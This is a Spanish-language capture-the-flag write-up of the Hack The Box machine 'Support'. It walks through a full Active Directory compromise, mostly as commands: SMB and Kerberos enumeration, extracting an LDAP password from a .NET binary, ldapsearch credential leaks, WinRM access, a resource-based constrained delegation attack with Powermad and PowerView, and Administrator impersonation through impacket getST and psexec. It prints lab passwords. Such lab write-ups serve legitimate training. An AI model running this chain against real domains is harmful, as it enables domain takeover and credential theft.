---
title: Support
description: "Support es una máquina Windows Easy de AD. Simula un controlador de dominio con un portal de soporte técnico: se accede por SMB anónimo, se descompila un binario .NET para robar credenciales LDAP y se enumeran usuarios hasta encontrar una contraseña expuesta. Luego, con acceso WinRM, se abusa de permisos `GenericAll` sobre el DC mediante RBCD para escalar hasta comprometer todo el dominio."
date: 2026-09-26
toc: true
pin: false
image: assets/img/htb-writeup-support/logo.png
categories:
  - Hack The Box
  - Machines
tags:
  - windows
  - smbmap
  - smbclient
  - bloohound
  - rusthound
  - nmap
  - GenericAll
  - kerberos user enumeration (kerbrute)
  - ldapsearch
  - impacket-getST
  - Resource-based Constrained Delegation (rbcd attack)
  - powermad
  - powerview
  - nxc
  - exe binary analysis
  - debugging with dnspy
---

## Recon

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn x.x.x.x -oG allports
```
![](assets/img/htb-writeup-support/1.png)





```bash
extractPorts allports
```
![](assets/img/htb-writeup-support/2.png)





```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49690,49706,50029 -sCV x.x.x.x -oN targeted
```

+ resultado + ``cat targeted -l java``
![](assets/img/htb-writeup-support/3.png)





## enumeración por smb

```bash
smbclient -L 10.129.117.62 -N
```
![](assets/img/htb-writeup-support/4.png)





```bash
smbmap -H 10.129.117.62 -u none
```
![](assets/img/htb-writeup-support/5.png)




````bash
nxc smb 10.129.117.62
````
![](assets/img/htb-writeup-support/6.png)




+ añadimos los dominios las comunes de AD al ``/etc/host`` 
```bash
echo '10.129.117.62 dc dc.support.htb support.htb' >> /etc/hosts
```
![](assets/img/htb-writeup-support/7.png)




```bash
smbclient //10.129.117.62/support-tools -N
```
![](assets/img/htb-writeup-support/7.5.png)




+ dentro de ``smbclient`` descargamos el ``UserInfo.exe.zip`` con ``get Userinfo`` y lo extraemos con ``unzip``.

![](assets/img/htb-writeup-support/8.png)



+ después con ``strings`` listamos la cadena de cadena de texto imprimible del ``UserInfo.exe`` y vemos 
  ``support\ldap``lo que nos indica que en programa usa el protocolo para comunicarse con el DC.


+ siguiendo con la enumeración usando ``kerbrute``para listar usuarios.
```bash
kerbrute userenum -d support.htb --dc 10.129.117.62 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
![](assets/img/htb-writeup-support/9.png)





## Exploitation

+ ahora pasamos al siguente paso de la explotacion y para esto necesitaremos un windows donde ejecutar el ``UserInfo.exe`` y analizarlo mas de cerca.


+ primero mover el zip mostrado antes con el ejecutable y la vpn de htb al nuevo sistema, esto con python.

```python
python -m http.server  
```

+ ya con eso pasamos a configurar la conexión de la vpn, en windows existe ``OpenVPN Connect`` solo es instalar y añadir la vpn al mismo y conectarse.
 
  
+ entonces ya con la conexión de la hecha podemos descomprimir el ``UserInfo.zip`` y ejecutarlo en powershell pero hay un problema windows no sabe que es ``support.htb`` por eso hay que añadirlo al ``/etc/hosts``de windows para eso solo es buscar:
 
```powershell
C:\Windows\System32\drivers\etc\hosts
```

+ entramos y añadimos la siguente linea para que el sistema sepa que es``support.htb`` 
  
  ```powershell
  IP -> x.x.x.x support.htb
  ```


+  pasando al programa y ejecutándolo nos sale lo siguiente:
   
   ```powershell
  C:\Users\ajente007\Documents\t\support\UserInfo.exe>.\UserInfo.exe

  Usage: UserInfo.exe [options] [commands]

  Options:
    -v|--verbose        Verbose output

  Commands:
    find                Find a user
    user                Get information about a user


  C:\Users\ajente007\Documents\t\support\UserInfo.exe>
   ```

+ pero vamos a grano directamente al pasarle las siguentes opciones devuelve una lista de usuarios y podemos enumeras una en especifico si queremos pero hay que pasar directamente a lo importante ``DnsPy``
 
  ```powershell
  .\UserInfo.exe find -first * -last *
  ```


+ ``DnsPy``es un debugger/descompilador y editor de ensamblados .NET open source se puede descargar desde su github.

+ es abrirlo y arrastrar el programa una vez dentro vamos has donde dice ``LdapQuery``
  ![](assets/img/htb-writeup-support/ldap-query.png)




+ una vez dentro es seleccionar ``password`` cuando este marcado en verde, damos ``F9`` para hacer un break point en la ejecución para que el programa se detenga en ese punto, recién hay un ``F5``   y nos aparece en un popup lo siguente:

![](assets/img/htb-writeup-support/pass.png)




+ ingresado estos argumentos y aceptamos. 

 ```powershell
 find -first * -last *
 ```

+ pero no vemos nada para eso tendremos de hacer ``F10`` que es avanzar al siguiente paso:

![](assets/img/htb-writeup-support/break.png)




+ tenemos contraseña.

![](assets/img/htb-writeup-support/pass2.png)





+ ya con esta, podemos pasar a enumerar con ``LdapSearch`` 

```
"nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz"
```

+ sabiendo que el usuario ``ldap`` existe podemos probar si es valido en el dominio con nxc.

```bash
nxc smb 10.129.117.62 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

+ vemos que el usuario es valido pero no forma parte WinRM así que no podemos se puede acceder por esta vía al dominio pero podemos conectarnos con ``rpcclient`` y listar usuarios y grupos:
  
  ```bash
  
    rpcclient -U 'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.129.230.181 -c 'enumdomusers' |      grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > user-list
  ```


+ este comando incluye una regex para filtrar por lo que nos interesa, listar los usuarios y crear un mini diccionario de nombres de usuarios validos del dominio, para eso vamos a probar de nuevo con ``nxc`` para ver si alguno ademas de ``ldap`` tiene como contraseña la que extrajimos del ``UserInfo``


+ pero ademas del usuario ``ldap`` ninguno es valido.


## enum de ldap + leak de info + user access via evil-winrm

+ en hacktricks buscamos en el panel izquierdo ``network services pentesting`` -> ``389, 636, 3268, 3269 - Pentesting LDAP`` bajando esta la opcion ``ldapsearch`` usamos la segunda plantilla con los datos que recopilados anteriormente.  

```bash
ldapsearch -x -H ldap://10.129.230.181 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep -i "samaccountname: support" -B 39
```

+ encontramos una contraseña en ``info -> Ironside47pleasure40Watchful `` al probar con la lista de usuarios es valida para el usuario ``support`` 

+ al probar, el usuario esta en ``Windows Remote Management "WinRM"`` asi que podemos acceder al dominio con ``evil-winrm``

```bash
evil-winrm -i 10.129.230.181 -u support -p Ironside47pleasure40Watchful
```

+ accedemos y leemos la flag de user.txt.


## rusthount + bloodhount enum

+ ya con credenciales pasamos a enumerar:

```bash
rusthound-ce --domain support.htb -u support -p 'Ironside47pleasure40Watchful'
```

+ con esto lanzamos bloodhount en un contenedor de docker.

```bash
 docker compose up -d bloodhound
```

+ una vez inicie correctamente accedemos al login las credenciales por defecto suelen  ser ``admin -> si la pass no te aparece con "docker logs content-bloodhound-1" solo es subir y deberias de ver una pass temporal que genera bloodhount`` 

 + logueado hay una opcion de ``upload files`` solo es subir los archivos ``json`` que dejo el ``rusthount``
 + al enumerar a que grupos pertenece el usuario ``support`` hay un grupo interesante,  ``SHARED SUPPORT ACCOUNTS`` que de paso comprobamos en bloodhound y tiene en privilegio ``GenericAll`` sobre el DC.

![](assets/img/htb-writeup-support/bloodhount.png)




+  para abusar de este priv vamos de nuevo a hacktricks ``Windows Hardening -> Resource-based Constrained Delegation`` bajamos hasta ``Attack``

+ pero antes de nesesitamos ``powermad``  

```bash

wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1
```

+ una vez descargado hay que moverlo al mismo directorio desde donde se lanzo la conexion, y subirlo con la ``skill "upload"`` que viene con evil-winrm.

+ se suba y la invocamos:
```powershell
Import-Module .\Powermad.ps1
```


+ pasos para la explotacion del ``GenericAll`` mediante ``rbcd attack`` 

```powershell

New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

```

+ nesesitamos ``powerview`` para chequear si ``SERVICEA`` a sido creado, descargar y lo mismo que con ``powermad`` subirlo al DC ``Import-Module``, etc.

```bash

wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1 
```

+ revisamos si funciono:

```powershell
Get-DomainComputer SERVICEA
```


+ de aqui en adelante solo es seguir la guia de explotacion del ``contrained attack`` via ``powerview`` en [HackTricks](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html) y ejecutar uno por uno.

![](assets/img/htb-writeup-support/powerview.png)



```powershell

$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid


$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"


$SDBytes = New-Object byte[] ($SD.BinaryLength)


$SD.GetBinaryForm($SDBytes, 0)


Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}


Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'

```


+ con eso pasamos al ``rbcd attack`` buscarmos ``rbdc.py`` y vamos a explotar ``### Getting the impersonated service ticket`` con ``getST.py`` de la suit de impacket.

```bash
getST.py -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.230.181 support.htb/SERVICEA$:123456
```

+ obtenemos un TGT del usuario en este caso Administrator:

![](assets/img/htb-writeup-support/TGT.png)



+ con ese ``TGT`` podemos conectarnos con ``psxec`` pero antes hoy que export una variable de entorno para que funcione.

```bash
export KRB5CCNAME=Administrator.ccache
```

```bash 
psexec.py -k dc.support.htb
```



![](assets/img/htb-writeup-support/psexec.png)


ir al Desktop y leer la flag con ``type root.txt`` 
